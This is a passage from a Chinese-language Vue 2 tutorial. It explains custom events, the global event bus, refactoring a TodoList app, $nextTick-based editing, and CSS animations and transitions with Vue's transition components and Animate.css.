<div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    \x3c!-- 绑定一个原生事件。要达到原生的效果，必须加上.native事件修饰符 --\x3e\n    <Student @click.native="showMsg" />\n  </div>\n</template>\n\n<script>\nimport Student from "./components/Student.vue";\nexport default {\n  name: "App",\n  components: {\n    Student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    showMsg() {\n      console.log(\'绑定了原生的点击事件\');\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 自定义事件是一种组件间通信的方式，适用于 子组件===>父组件。\n 2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。\n 3. 绑定自定义事件：\n    1. 第一种方式，在父组件中：<Student @xxx="yyy" />，xxx是自定义事件的名称，yyy是回调函数。\n    2. 第二种方式，在mounted生命钩子中：this.$refs.zzz.$on(\'xxx\', yyy)，xxx是自定义事件的名称，yyy是回调函数，zzz是子组件上的ref属性值。\n    3. 若想让自定义事件只触发一次，可以使用.once事件修饰符，或this.$refs.zzz.$once(\'xxx\', yyy)。\n 4. 触发自定义事件：this.$emit(\'xxx\', 数据)，xxx是自定义事件的名称。这个触发一般写在子组件里，从子组件传递数据给父组件 。\n 5. 解绑自定义事件：this.$off(\'xxx\')或this.$refs.zzz.$off(\'xxx\', yyy)，在子组件或者父组件里解绑。\n 6. 在父组件中可以为子组件绑定原生事件，但需要.native事件修饰符。\n 7. 注意：通过this.$refs.zzz.$on(\'xxx\', yyy)绑定自定义事件时，yyy回调函数要么配置在methods里（this自然指向父组件实例），要么直接定义在此处但要使用箭头函数（否则this会指向子组件实例，一般我们期望它指向父组件实例）。\n\n----------------------------------------\n\n\n# 5.4 TodoList使用自定义事件\n\n在TodoList案例中，父组件App、子组件AddTodo、子组件TodoMain、子组件TotalTodo、孙组件TodoItem，我们在这一节要对App、AddTodo和TotalTodo进行改造，将“通过props传递函数”的方式改为“自定义事件”的方式，涉及孙组件这条线的旧方式我们暂时不动（在下一节会讲）。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 将`:addTodo="addTodo"`改为自定义事件 --\x3e\n    <AddTodo @addTodoEvent="addTodo"></AddTodo>\n    \x3c!-- 涉及到孙组件就不改动了 --\x3e\n    <TodoMain\n      :todos="todos"\n      :checkTodo="checkTodo"\n      :deleteTodo="deleteTodo"\n    ></TodoMain>\n    \x3c!-- 将`:checkAllTodo="checkAllTodo"`和`:clearAllTodo="clearAllTodo"`改为自定义事件 --\x3e\n    <TotalTodo\n      :todos="todos"\n      @checkAllEvent="checkAllTodo"\n      @clearAllEvent="clearAllTodo"\n    ></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  data() {\n    return {\n      todos: JSON.parse(localStorage.getItem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonStr = JSON.stringify(value);\n        localStorage.setItem("todos", jsonStr);\n      },\n    },\n  },\n  methods: {\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkAllTodo(done) {\n      this.todos.forEach((item) => (item.done = done));\n    },\n    clearAllTodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\nAddTodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input\n      type="text"\n      placeholder="请输入你的任务名称，按回车键确认"\n      v-model.trim="title"\n      @keyup.enter="addItem"\n    />\n  </div>\n</template>\n\n<script>\nimport { nanoid } from "nanoid";\nexport default {\n  name: "AddTodo",\n  data() {\n    return {\n      title: "",\n    };\n  },\n  methods: {\n    addItem() {\n      if (!this.title) return;\n      const item = { id: nanoid(), title: this.title, done: false };\n      // 删除props里的addTodo，然后在这里改为$emit触发自定义事件addTodoEvent\n      this.$emit("addTodoEvent", item);\n      this.title = "";\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nTotalTodo.vue：\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" v-model="isAll" />\n    </label>\n    <span>\n      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "TotalTodo",\n  props: ["todos"],\n  computed: {\n    total() {\n      return this.todos.length;\n    },\n    doneTotal() {\n      const count = this.todos.reduce((accumulator, currItem) => {\n        return accumulator + (currItem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    isAll: {\n      get() {\n        return this.total > 0 && this.total === this.doneTotal;\n      },\n      set(val) {\n        // 删除props里的checkAllTodo，然后在这里改为$emit触发自定义事件checkAllEvent\n        this.$emit("checkAllEvent", val);\n      },\n    },\n  },\n  methods: {\n    clearAll() {\n      // 删除props里的clearAllTodo，然后在这里改为$emit触发自定义事件clearAllEvent\n      this.$emit("clearAllEvent");\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 5.5 全局事件总线\n\n给一个组件绑定和触发自定义事件，是可以在组件的外部或内部进行的。这是因为，在内部可以通过this获取组件实例，在外部可以通过this.$refs.xxx来获取组件实例，又因为组件实例可以通过__proto__访问原型上的$on()和$emit()，所以不管是在组件的外部或内部都能进行绑定和触发自定义事件。这一点非常重要，基本是这一章的核心思想了。\n\n那如果我们准备一个所有组件都能访问到的公共组件，那其他组件是不是都可以使用这个公共组件的$on()和$emit()了。\n\n我们让A组件访问公共组件的$on()，给这个公共组件绑定一个自定义事件，回调函数留给A组件；再让B组件去访问公共组件的$emit()，触发之前的同名自定义事件（携带新数据），这样B组件与A组件进行了单方面通信。反之亦然，A也能与B进行通信，那么实际上就是双方通信。那么再把范围扩大，那所有的组件之间都能进行互相通信了（任意组件间的通信）。\n\n但现在要考虑这个公共组件是谁，要存在于哪：\n\n * 我们明确一点，组件实例的__proto__指向的原型对象，是继承自Vue.prototype的，这个在2.5 VueComponent这节说过。那么组件实例通过__proto__访问到原型对象，该原型对象又通过继承关系访问到Vue.prototype，就可以拿到$on()和$emit()。\n * 不要妄想直接通过Vue.prototype.$on()和Vue.prototype.$emit()来绑定自定义事件，你绑定给谁？还得是一个实例。那是Vue实例vm还是某个组件实例vc呢？\n * 其实公共组件是Vue实例vm。使用$on()和$emit()时，直接通过vm的__proto__拿就可以了；如果是一个单独的新组件实例，链路会长一点。\n * 公共组件是谁搞清楚了，那这个vm存在哪了？以前是用const vm=来接收它，在脚手架项目是没有这样的，可以在main.js给Vue进行实例化时使用beforeCreate生命钩子，将this存到Vue.prototype，即Vue.prototype.$bus = this。这个$bus就是这一节的全局事件总线。\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App),\n  components: {\n    App\n  },\n  beforeCreate() {\n    // 安装全局事件总线，所有组件都能访问到$bus，并且所有组件都能使\n    // 用到$bus的`$on()`和`$emit()`将自定义事件绑定到$bus身上\n    Vue.prototype.$bus = this;\n  }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们用School和Student来演示平级组件间使用全局事件总线进行互相通信。\n\nApp.vue：\n\n<template>\n  <div class="outer">\n    <h2>这里是父组件，本例不会涉及到父组件</h2>\n    <School />\n    <Student />\n  </div>\n</template>\n\n<script>\nimport School from "./components/School.vue";\nimport Student from "./components/Student.vue";\nexport default {\n  name: "App",\n  components: {\n    School,\n    Student,\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nSchool.vue：\n\n<template>\n  <div class="school">\n    <h2>School-Info：{{ info }}</h2>\n    <h3>学校：{{ name }}</h3>\n    <h3>地址：{{ address }}</h3>\n    <button @click.stop="changeInfo">修改Student组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "School",\n  data() {\n    return {\n      info: "School这里还未被修改",\n      name: "武汉大学",\n      address: "武汉市武昌区珞珈山路",\n    };\n  },\n  mounted() {\n    // 给$bus绑定一个自定义事件changeSchoolEvent，将回调函数updateInfo留在了School组件本地\n    this.$bus.$on("changeSchoolEvent", this.updateInfo);\n  },\n  beforeDestroy(){\n    // 在本组件销毁前解绑之前绑定的自定义事件，否则当前组件销毁了，该事件一直存在\n    this.$bus.$off("changeSchoolEvent");\n  },\n  methods: {\n    updateInfo(info) {\n      this.info = info;\n    },\n    changeInfo() {\n      // 触发$bus上的changeStudentEvent事件，用以School对Student的通信\n      this.$bus.$emit(\n        "changeStudentEvent",\n        "由School组件修改了Student组件的展示信息"\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nStudent.vue：\n\n<template>\n  <div class="student">\n    <h2>Student-Info：{{ info }}</h2>\n    <h3>姓名：{{ name }}</h3>\n    <h3>年龄：{{ age }}</h3>\n    <button @click.stop="changeInfo">修改School组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  data() {\n    return {\n      info: "Student这里还未被修改",\n      name: "张三",\n      age: 18,\n    };\n  },\n  mounted() {\n    // 给$bus绑定一个自定义事件changeStudentEvent，将回调函数updateInfo留在了Student组件本地\n    this.$bus.$on("changeStudentEvent", this.updateInfo);\n  },\n  beforeDestroy(){\n    // 在本组件销毁前解绑之前绑定的自定义事件，否则当前组件销毁了，该事件一直存在\n    this.$bus.$off("changeStudentEvent");\n  },\n  methods: {\n    updateInfo(info) {\n      this.info = info;\n    },\n    changeInfo() {\n      // 触发$bus上的changeSchoolEvent事件，用以Student对School的通信\n      this.$bus.$emit(\n        "changeSchoolEvent",\n        "由Student组件修改了School组件的展示信息"\n      );\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 全局事件总线是一种组件间通信的方式，适用于任意组件间的通信。\n 2. 安装全局事件总线，在new Vue()时，使用beforeCreate生命钩子，在里面写上Vue.prototype.$bus = this。\n 3. 使用全局事件总线：\n    1. 接收数据（绑定事件）：A组件想要接收数据，则在A组件中给$bus绑定自定义事件，事件的回调函数留在A组件自身。this.$bus.$on(事件名, 回调函数)\n    2. 提供数据（触发事件）：在其他组件使用this.$bus.$emit(事件名, 数据)进行传递数据。\n 4. 最好在当前组件的beforeDestroy生命钩子中，用$off去解绑当前组件之前绑定的自定义事件。\n\n----------------------------------------\n\n\n# 5.6 TodoList使用全局事件总线\n\n在5.4 TodoList使用自定义事件这节里我们留下了孙组件这条线没有修改，我们可以让孙组件TodoItem与祖父组件App之间使用全局事件总线。当然，其他组件之间也是可以使用全局事件总线的，但是没有必要。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 将`:addTodo="addTodo"`改为自定义事件 --\x3e\n    <AddTodo @addTodoEvent="addTodo"></AddTodo>\n    \x3c!-- 涉及到孙组件就不改动了 --\x3e\n    <TodoMain :todos="todos"></TodoMain>\n    \x3c!-- 将`:checkAllTodo="checkAllTodo"`和`:clearAllTodo="clearAllTodo"`改为自定义事件 --\x3e\n    <TotalTodo\n      :todos="todos"\n      @checkAllEvent="checkAllTodo"\n      @clearAllEvent="clearAllTodo"\n    ></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  mounted() {\n    // 在全局事件总线上注册自定义事件，方便孙组件TodoItem进行触发事件，回调函数留在本组件\n    this.$bus.$on("checkTodoEvent", this.checkTodo);\n    this.$bus.$on("deleteTodoEvent", this.deleteTodo);\n  },\n  beforeDestroy() {\n    // 绑定在全局事件总线上的自定义事件，记得在本组件销毁前要解绑自定义事件\n    this.$bus.$off("checkTodoEvent");\n    this.$bus.$off("deleteTodoEvent");\n  },\n  data() {\n    return {\n      todos: JSON.parse(localStorage.getItem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonStr = JSON.stringify(value);\n        localStorage.setItem("todos", jsonStr);\n      },\n    },\n  },\n  methods: {\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    // 提供给孙组件TodoItem来触发的自定义事件的回调函数checkTodo\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 提供给孙组件TodoItem来触发的自定义事件的回调函数deleteTodo\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkAllTodo(done) {\n      this.todos.forEach((item) => (item.done = done));\n    },\n    clearAllTodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n\n\nTodoItem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoItem.done"\n        @change="handleCheck(todoItem.id)"\n      />\n      <span>{{ todoItem.title }}</span>\n    </label>\n    <button class="btn btn-danger" @click="handleDelete(todoItem.id)">\n      删除\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n  props: ["todoItem"],\n  methods: {\n    handleCheck(id) {\n      if (!id) return;\n      // 触发祖父组件App绑定在全局事件总线上的自定义事件checkTodoEvent，并传递数据给父组件\n      this.$bus.$emit("checkTodoEvent", id);\n    },\n    handleDelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n      // 触发祖父组件App绑定在全局事件总线上的自定义事件checkTodoEvent，并传递数据给父组件\n        this.$bus.$emit("deleteTodoEvent", id);\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 5.7 给TodoList追加编辑功能\n\n这一节要给已有的TodoList追加编辑功能，让每一项可以进行单独的编辑，实现该功能有这些注意点：\n\n * 每一项的删除按钮旁要新增一个编辑按钮，还要加上一个输入框，在编辑状态下隐藏“编辑按钮”，并让输入框覆盖原来的文本。\n * 给TodoItem组件新增一个data数据，名为isEdit。\n * 按下编辑按钮修改isEdit；输入完失去焦点也得修改isEdit，输入完得修改todos数据，得使用全局事件总线。\n * 按下编辑按钮得让输入框立即获得焦点，但是修改isEdit不会立马让页面更新，原因是浏览器要等修改数据这一轮task执行完，才能去执行更新页面这一轮task，那么focus必须得延迟到“更新页面这一轮task*”之后再执行。Vue给我们提供了$nextTick(callback)，让callback在下一次更新完之后调用（下一轮task执行完之后调用callback）。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    <AddTodo @addTodoEvent="addTodo"></AddTodo>\n    <TodoMain :todos="todos"></TodoMain>\n    <TotalTodo\n      :todos="todos"\n      @checkAllEvent="checkAllTodo"\n      @clearAllEvent="clearAllTodo"\n    ></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  mounted() {\n    this.$bus.$on("checkTodoEvent", this.checkTodo);\n    this.$bus.$on("deleteTodoEvent", this.deleteTodo);\n    // 编辑后更新title\n    this.$bus.$on("updateTodoEvent", this.updateTodo);\n  },\n  beforeDestroy() {\n    this.$bus.$off("checkTodoEvent");\n    this.$bus.$off("deleteTodoEvent");\n    this.$bus.$off("updateTodoEvent");\n  },\n  data() {\n    return {\n      todos: JSON.parse(localStorage.getItem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      deep: true,\n      handler(value) {\n        const jsonStr = JSON.stringify(value);\n        localStorage.setItem("todos", jsonStr);\n      },\n    },\n  },\n  methods: {\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkAllTodo(done) {\n      this.todos.forEach((item) => (item.done = done));\n    },\n    clearAllTodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n    // 编辑后更新title\n    updateTodo(id, title) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.title = title;\n          break;\n        }\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\nTodoItem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoItem.done"\n        @change="handleCheck(todoItem.id)"\n      />\n      <span v-show="!isEdit">{{ todoItem.title }}</span>\n      <input\n        type="text"\n        v-show="isEdit"\n        :value="todoItem.title"\n        ref="inputTodo"\n        @blur="inputBlur(todoItem.id, $event)"\n      />\n    </label>\n    <button class="btn btn-danger" @click="handleDelete(todoItem.id)">\n      删除\n    </button>\n    <button class="btn btn-edit" @click="handleEdit" v-show="!isEdit">\n      编辑\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n  props: ["todoItem"],\n  data() {\n    return {\n      isEdit: false,\n    };\n  },\n  methods: {\n    handleCheck(id) {\n      if (!id) return;\n      this.$bus.$emit("checkTodoEvent", id);\n    },\n    handleDelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n        this.$bus.$emit("deleteTodoEvent", id);\n      }\n    },\n    // 处理编辑操作\n    handleEdit() {\n      // 这一轮走完都是只是修改了data数据，下一轮才是更新页面\n      this.isEdit = true;\n      // 如果不使用$nextTick，这一轮的input还未展示到页面，所以必须等到下一轮页面更新完，再让input获得焦点\n      this.$nextTick(() => {\n        this.$refs.inputTodo.focus();\n      });\n    },\n    // 失去焦点\n    inputBlur(id, e) {\n      if (!id) return;\n      this.isEdit = false;\n      // 更新todos里的title\n      this.$bus.$emit("updateTodoEvent", id, e.target.value);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 六、Vue中的动画与过渡\n\n\n# 6.1 动画\n\n回顾一下css中原生的动画，animation: duration timing-function delay iteration-count direction fill-mode play-state name：\n\n * duration：动画总时间\n * timing-function：动效方式\n * delay：延时触发时间\n * iteration-count：播放次数，可以带小数位\n * direction：播放方向，其值normal正向播放，reverse方向播放，alternate正向交替播放，alternate-reverse方向交替播放。\n * fill-mode：确定开始前或结束后是什么样式，其值none默认样式，forwards采用遇到的最后的一个关键帧，backwards采用遇到的第一个关键帧，both同时应用forwards和backwards。\n * play-state：动画是运行或暂停，running和paused。\n * name：@keyframes动画名字。\n\n我们使用animation搭配:class来实现动画的切换（就是修改className），代码如下\n\n<template>\n  <div>\n    <button @click="switchDisplay">显示/隐藏</button>\n    <h2 :class="displayNow">你好啊啊啊啊啊</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "AnimationTest",\n  data() {\n    return { displayNow: "display-enter" };\n  },\n  methods: {\n    switchDisplay() {\n      this.displayNow =\n        this.displayNow === "display-leave" ? "display-enter" : "display-leave";\n    },\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 进入时的class */\n.display-enter {\n  animation: 3s ease 0.2s 1 normal both running aniEnter;\n}\n/* 出去时的class，注意切换动画不要用reverse，最好新建单独的离开@keyframes动画 */\n.display-leave {\n  animation: 3s ease 0.2s 1 normal both running aniLeave;\n}\n@keyframes aniEnter {\n  from {\n    transform: translateX(-100%);\n  }\n  to {\n    transform: translateX(0);\n  }\n}\n@keyframes aniLeave {\n  from {\n    transform: translateX(0);\n  }\n  to {\n    transform: translateX(-100%);\n  }\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n上面这种方式在没有遇到v-show或v-if之前还是挺好用的，一旦遇到v-show或v-if，上面这种方式就无法奏效了。因为在元素被移除或者display:none，动画不会被执行。其实Vue给我们封装好了过渡和动画，只需要我们使用简单的css样式搭配类名就可以使用了。\n\n\n\n<trnsition>标签用于包裹一个想要执行动画的元素或组件：\n\n * transition只是一个标签，不占位置不会形成一个真正的元素，这个同template一样。\n * transition标签可用name属性区分是哪个组件用什么动画样式，不至于混淆。\n   * 如果没有name属性，那css中关联的动画样式类名就是默认的.v-enter-active和.v-leave-active。\n   * 如果有name属性，比如name属性值是hello，那css中关联的动画样式名就.hello-enter-active和.hello-leave-active。\n * .v-enter-active {animation:xxx}是进入时执行动画的样式，.v-leave-active {animation:xxx}是离开时执行动画的样式。\n * 如果想在初始化就进行动画的执行，可以在transition标签里加上:appear="true"\n\n<template>\n  <div>\n    <button @click="displayNow = !displayNow">显示/隐藏</button>\n    \x3c!-- Vue提供的transition，能让v-if和v-show加上animation动画 --\x3e\n    <transition name="hello" :appear="true">\n      <h2 v-if="displayNow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "AnimationTest",\n  data() {\n    return { displayNow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 如果transition标签没有name属性，那它默认是.v-enter-active，如果有name那就是.name值-enter-active */\n.hello-enter-active {\n  animation: 3s ease 0.2s 1 normal both running aniEnter;\n}\n/* 如果transition标签没有name属性，那它默认是.v-leave-active，如果有name那就是.name值-leave-active */\n.hello-leave-active {\n  animation: 3s ease 0.2s 1 normal both running aniLeave;\n}\n@keyframes aniEnter {\n  from {\n    transform: translateX(-100%);\n  }\n  to {\n    transform: translateX(0);\n  }\n}\n@keyframes aniLeave {\n  from {\n    transform: translateX(0);\n  }\n  to {\n    transform: translateX(-100%);\n  }\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 6.2 过渡\n\n因为animation有@keyframes，可以在@keyframes里决定开始和结束的状态，那么动画的类名也只涉及到.v-enter-active和.v-leave-active。而这个transition没有@keyframes，那就需要单独定义开始和结束的状态。\n\ntransition的类名除了需要.v-enter-active和.v-leave-active以外（甚至一些情况下不需要这两个类名，直接将过渡信息写在元素本身上），还需要v-enter、v-enter-to、v-leave-to、v-leave-to，分别表示“进入过程的开始状态”、“进入过程的结束状态”、“离开过程的开始状态”“离开过程的结束状态”。\n\n<template>\n  <div>\n    <button @click="displayNow = !displayNow">显示/隐藏</button>\n    \x3c!-- Vue提供的transition，能让v-if和v-show加上animation动画 --\x3e\n    <transition name="hello" :appear="true">\n      <h2 v-show="displayNow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "AnimationTest",\n  data() {\n    return { displayNow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n/* 过渡信息写在这两个类名里，甚至可以直接放到h2元素里 */\n.hello-enter-active,\n.hello-leave-active {\n  transition: 3s ease;\n}\n/* 进入过程的开始状态就是-100%，并且离开过程的结束状态也是-100% */\n.hello-enter,\n.hello-leave-to {\n  transform: translateX(-100%);\n}\n/* 进入过程的结束状态就是0，并且离开过程的开始状态也是0 */\n.hello-enter-to,\n.hello-leave {\n  transform: translateX(0);\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 6.3 多元素动画/过渡\n\n多个元素进行动画/过渡，可以使用v-if控制只显示一个，也可以使用单独的容器将多个元素进行包裹再使用<transition>标签。还有一种是使用<transition-group>。注意：同名元素or组件，得使用key来区分彼此。\n\nv-if方式：\n\n<template>\n  <transition>\n    <button v-if="isEditing" key="save">\n      Save\n    </button>\n    <button v-else key="edit">\n      Edit\n    </button>\n  </transition>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n<transition-group>方式：\n\n<template>\n  <div>\n    <button @click="displayNow = !displayNow">显示/隐藏</button>\n    \x3c!-- 简单修改了上一节的模板即可 --\x3e\n    <transition-group name="hello" :appear="true">\n      \x3c!-- 使用key来区分 --\x3e\n      <h2 v-show="displayNow" key="1">你好啊啊啊啊啊</h2>\n      <h2 v-show="!displayNow" key="2">我不好啊啊啊啊</h2>\n    </transition-group>\n  </div>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 6.4 集成第三方动画库\n\n推荐[Animate.css](https://animate.style/)， 使用npm i animate.css进行安装，安装之后引入到项目里import "animate.css"`。\n\n然后选择一个要使用动画的<transition>或<transition-group>，在标签里添加name="animate__animated animate__bounce"，如果不是Vue项目，这个name换成class。\n\n再就是使用Vue给我们提供的6个自定义过渡的类名，是专门用来配合第三方动画库来使用的。这6个和6.2 过渡这节里的类名极其相似，只是将v-换成class放到了末尾。\n\n * enter-active-class：进入过程的动效\n * leave-active-class：离开过程的动效\n * enter-class：进入过程的开始状态\n * enter-to-class：进入过程的结束状态\n * leave-class：离开过程的开始状态\n * leave-to-class：离开过程的结束状态\n\n<template>\n  <div>\n    <button @click="displayNow = !displayNow">显示/隐藏</button>\n    \x3c!-- 引入第三方动画库 --\x3e\n    <transition\n      :appear="true"\n      name="animate__animated animate__bounce"\n      enter-active-class="animate__backInDown"\n      leave-active-class="animate__backOutRight"\n    >\n      <h2 v-show="displayNow">你好啊啊啊啊啊</h2>\n    </transition>\n  </div>\n</template>\n\n<script>\nimport "animate.css";\nexport default {\n  name: "AnimationTest",\n  data() {\n  